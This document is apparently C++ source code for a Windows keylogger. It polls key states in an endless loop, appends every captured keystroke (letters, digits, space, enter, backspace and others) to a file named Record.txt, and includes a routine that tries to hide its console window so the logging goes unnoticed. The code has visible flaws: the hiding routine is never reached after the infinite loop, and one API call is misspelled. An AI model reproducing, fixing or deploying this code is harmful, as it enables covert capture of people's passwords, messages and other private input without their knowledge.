#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <windows.h>
#include <winuser.h>



using namespace std;

void log();
void hide();

int main() {
	log();
	hide();
    return 0;
}

void log(){
    char c;


    for(;;){
    	for( c = 8; c <= 222; c++){
    		if(GetAsyncKeyState(c) == -32767){
    			ofstream write ("Record.txt", ios::app);

    			if(((c>64)&&(c<91)) && !(GetAsyncKeyState(0x10))){
    				c+=32;
    				write << c;
    				write.close();
    				break;
    			}else if((c>64)&&(c<91)){
    				write << c;
    				write.close();
    				break;
    			}else{
    				switch(c){
    				case 49:{
    					if(GetAsyncKeyState(0x10)){
    						write << "!";
    					}else{
    						write <<"1";
    					}
    				}
    				break;

    				case VK_SPACE:
    					write << " ";
    					break;

    				case VK_RETURN:
    					write << "\n";
    					break;

    				case VK_TAB:
    					write << "	";
    					break;

    				case VK_BACK:
    					write << "<BACKSPACE>";
    					break;

    				case VK_ESCAPE:
    					write << "<ESC>";
    					break;

    				case VK_DELETE:
    					write << "Delete";
    					break;
    				}
    			}
    		}
    	}
    }




//	switch(c){
//	case 8: write << "<BackSpace>";
//	break;
//	case 27: write << "<Esc>";
//	break;
//	case 127: write << "DEL";
//	break;
//	case 32: write << " ";
//	break;
//	case 13: write << "<Enter>\n";
//	break;
//	default: write << c;
//	}

}
void hide(){
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	showWindow(stealth,0);
}

